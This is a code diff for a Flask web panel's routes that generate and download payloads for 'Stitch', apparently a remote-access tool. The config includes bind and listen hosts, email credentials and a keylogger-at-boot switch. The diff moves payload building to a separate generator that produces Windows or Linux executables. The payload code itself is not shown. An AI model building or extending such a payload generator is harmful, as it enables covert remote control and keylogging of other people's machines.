@@ -787,106 +787,73 @@ def export_commands():
 @login_required
 @limiter.limit("5 per hour")  # Limit payload generation
 def generate_payload():
-    """Generate Stitch payload with specified configuration"""
+    """Generate Stitch payload with specified configuration - ENHANCED VERSION"""
     try:
         metrics_collector.increment_counter('api_requests')
         data = request.json or {}
         
+        # Import the enhanced payload generator
+        from web_payload_generator import web_payload_gen
+        
         # Get configuration from request
-        bind_host = data.get('bind_host', '')
-        bind_port = data.get('bind_port', '4433')
-        listen_host = data.get('listen_host', 'localhost') 
-        listen_port = data.get('listen_port', '4455')
-        enable_bind = data.get('enable_bind', True)
-        enable_listen = data.get('enable_listen', True)
+        config = {
+            'bind_host': data.get('bind_host', ''),
+            'bind_port': data.get('bind_port', '4433'),
+            'listen_host': data.get('listen_host', 'localhost'),
+            'listen_port': data.get('listen_port', '4455'),
+            'enable_bind': data.get('enable_bind', True),
+            'enable_listen': data.get('enable_listen', True),
+            'platform': data.get('platform', 'linux'),  # Support platform selection
+            'payload_name': data.get('payload_name', 'stitch_payload')
+        }
         
-        # Validate inputs
-        try:
-            bind_port = int(bind_port)
-            listen_port = int(listen_port)
-            if not (1 <= bind_port <= 65535) or not (1 <= listen_port <= 65535):
-                raise ValueError("Invalid port range")
-        except ValueError:
-            return jsonify({'error': 'Invalid port numbers'}), 400
+        log_debug(f"Generating payload for platform: {config['platform']}", "INFO", "Payload")
         
-        # Import payload generation
-        from Application.stitch_gen import run_exe_gen
-        from Application.stitch_pyld_config import stitch_ini
-        # Ensure a valid default config exists before attempting to write values
-        try:
-            from Application.stitch_pyld_config import gen_default_st_config
-        except Exception:
-            gen_default_st_config = None
-        import tempfile
-        import shutil
+        # Generate payload using enhanced generator
+        result = web_payload_gen.generate_payload(config)
         
-        # Create temporary config
-        config_backup = None
-        try:
-            # Backup existing config if it exists
+        if result['success']:
+            # Store payload info in session for download
+            session['payload_path'] = result['payload_path']
+            session['payload_filename'] = result['filename']
+            session['payload_type'] = result['payload_type']
+            session['payload_platform'] = result['platform']
+            
+            log_debug(f"Payload generated: {result['filename']} ({result['size']} bytes, {result['payload_type']})", "INFO", "Payload")
+            
+            # Clean up old payloads (keep last 10)
             try:
-                from Application.Stitch_Vars.globals import st_config
-            except Exception as e:
-                log_debug(f"Config error: {e}", "ERROR", "Config")
-                st_config = os.path.join('Application', 'Stitch_Vars', 'stitch_config.ini')
-            if os.path.exists(st_config):
-                config_backup = st_config + '.backup'
-                shutil.copy2(st_config, config_backup)
-
-            # Create a default config file if missing so section writes succeed
-            if not os.path.exists(st_config) and gen_default_st_config:
-                try:
-                    gen_default_st_config()
-                except Exception as e:
-                    log_debug(f"Failed to create default payload config: {e}", "ERROR", "Config")
-
-            # Create new config with web parameters
-            stini = stitch_ini()
-            stini.set_value('BIND', str(enable_bind))
-            stini.set_value('BHOST', bind_host)
-            stini.set_value('BPORT', str(bind_port))
-            stini.set_value('LISTEN', str(enable_listen))
-            stini.set_value('LHOST', listen_host)
-            stini.set_value('LPORT', str(listen_port))
-            stini.set_value('EMAIL', 'None')
-            stini.set_value('EMAIL_PWD', '')
-            stini.set_value('KEYLOGGER_BOOT', 'False')
+                web_payload_gen.cleanup_old_payloads(keep_last=10)
+            except:
+                pass  # Don't fail if cleanup fails
             
-            # Generate payload
-            run_exe_gen(auto_confirm=True, create_installers=False)
+            response_data = {
+                'success': True,
+                'message': result['message'],
+                'payload_size': result['size'],
+                'payload_type': result['payload_type'],
+                'platform': result['platform'],
+                'filename': result['filename'],
+                'config': {
+                    'bind_host': config['bind_host'],
+                    'bind_port': config['bind_port'],
+                    'listen_host': config['listen_host'],
+                    'listen_port': config['listen_port'],
+                    'enable_bind': config['enable_bind'],
+                    'enable_listen': config['enable_listen'],
+                    'platform': config['platform']
+                },
+                'download_url': '/api/download-payload'
+            }
             
-            # Find generated payload
-            payload_path = None
-            if os.path.exists('Configuration/st_main.py'):
-                payload_path = 'Configuration/st_main.py'
-                
-                # Read the payload content
-                with open(payload_path, 'r') as f:
-                    payload_content = f.read()
-                
-                log_debug(f"Payload generated successfully: {len(payload_content)} bytes", "INFO", "Payload")
-                
-                return jsonify({
-                    'success': True,
-                    'message': 'Payload generated successfully',
-                    'payload_size': len(payload_content),
-                    'config': {
-                        'bind_host': bind_host,
-                        'bind_port': bind_port,
-                        'listen_host': listen_host,
-                        'listen_port': listen_port,
-                        'enable_bind': enable_bind,
-                        'enable_listen': enable_listen
-                    },
-                    'download_url': '/api/download-payload'
-                })
-            else:
-                return jsonify({'error': 'Payload generation failed - no output file'}), 500
-                
-        finally:
-            # Restore backup config
-            if config_backup and os.path.exists(config_backup):
-                shutil.move(config_backup, st_config)
+            # Add warning if fallback to Python script
+            if 'warning' in result:
+                response_data['warning'] = result['warning']
+            
+            return jsonify(response_data)
+        else:
+            log_debug(f"Payload generation failed: {result['message']}", "ERROR", "Payload")
+            return jsonify({'error': result['message']}), 500
         
     except Exception as e:
         log_debug(f"Payload generation error: {str(e)}", "ERROR", "Payload")
@@ -917,21 +884,71 @@ def configure_payload():
 @app.route('/api/download-payload')
 @login_required
 def download_payload():
-    """Download the generated payload"""
+    """Download the generated payload - ENHANCED VERSION"""
     try:
         metrics_collector.increment_counter('api_requests')
-        payload_path = 'Configuration/st_main.py'
+        
+        # Get payload info from session
+        payload_path = session.get('payload_path')
+        payload_filename = session.get('payload_filename', 'stitch_payload')
+        payload_type = session.get('payload_type', 'script')
+        payload_platform = session.get('payload_platform', 'python')
+        
+        # Fallback to checking for last generated payload
+        if not payload_path:
+            from web_payload_generator import web_payload_gen
+            payload_path = web_payload_gen.get_last_payload()
+            
+            if payload_path:
+                payload_filename = os.path.basename(payload_path)
+                if payload_path.endswith('.exe'):
+                    payload_type = 'executable'
+                    payload_platform = 'windows'
+                elif payload_path.endswith('.py'):
+                    payload_type = 'script'
+                    payload_platform = 'python'
+                else:
+                    payload_type = 'executable'
+                    payload_platform = 'linux'
+        
+        # Final fallback to Python script
+        if not payload_path or not os.path.exists(payload_path):
+            payload_path = 'Configuration/st_main.py'
+            payload_filename = 'stitch_payload.py'
+            payload_type = 'script'
+            payload_platform = 'python'
         
         if os.path.exists(payload_path):
-            log_debug("Payload downloaded", "INFO", "Payload")
-            return send_file(payload_path, 
-                           as_attachment=True, 
-                           download_name='stitch_payload.py',
-                           mimetype='text/x-python')
+            # Determine MIME type based on file type
+            if payload_filename.endswith('.exe'):
+                mimetype = 'application/x-msdownload'
+            elif payload_filename.endswith('.py'):
+                mimetype = 'text/x-python'
+            else:
+                # Generic binary for Linux/Mac executables
+                mimetype = 'application/octet-stream'
+            
+            log_debug(f"Payload downloaded: {payload_filename} (type: {payload_type}, platform: {payload_platform})", "INFO", "Payload")
+            
+            # Add appropriate headers
+            response = send_file(
+                payload_path,
+                as_attachment=True,
+                download_name=payload_filename,
+                mimetype=mimetype
+            )
+            
+            # Add custom headers with payload info
+            response.headers['X-Payload-Type'] = payload_type
+            response.headers['X-Payload-Platform'] = payload_platform
+            
+            return response
         else:
+            log_debug(f"Payload file not found: {payload_path}", "ERROR", "Payload")
             return jsonify({'error': 'No payload available for download'}), 404
             
     except Exception as e:
+        log_debug(f"Error downloading payload: {str(e)}", "ERROR", "Payload")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/upload', methods=['POST'])
